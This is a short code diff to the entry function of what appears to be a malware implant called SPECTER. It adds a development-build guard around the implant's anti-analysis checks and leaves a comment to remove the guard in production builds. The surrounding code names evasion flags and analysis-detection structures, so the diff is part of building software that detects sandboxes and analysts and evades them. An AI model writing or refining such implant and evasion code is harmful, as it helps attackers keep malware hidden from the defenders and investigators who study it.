@@ -67,6 +67,10 @@ void implant_entry(PVOID param) {
     (void)status;
 
     /* ---- Step 3c: Anti-analysis checks ---- */
+    /* NOTE: Anti-analysis runs BEFORE config is loaded, so we cannot
+       check evasion_flags here.  For dev/testing builds, skip entirely.
+       In production, remove the #ifndef guard. */
+#ifndef SPECTER_DEV_BUILD
     {
         ANTIANALYSIS_CONFIG aa_cfg;
         ANALYSIS_RESULT aa_result;
@@ -77,6 +81,7 @@ void implant_entry(PVOID param) {
             return;
         }
     }
+#endif
 
     /* ---- Step 4: Initialize config store ---- */
     status = cfg_init(&g_ctx);
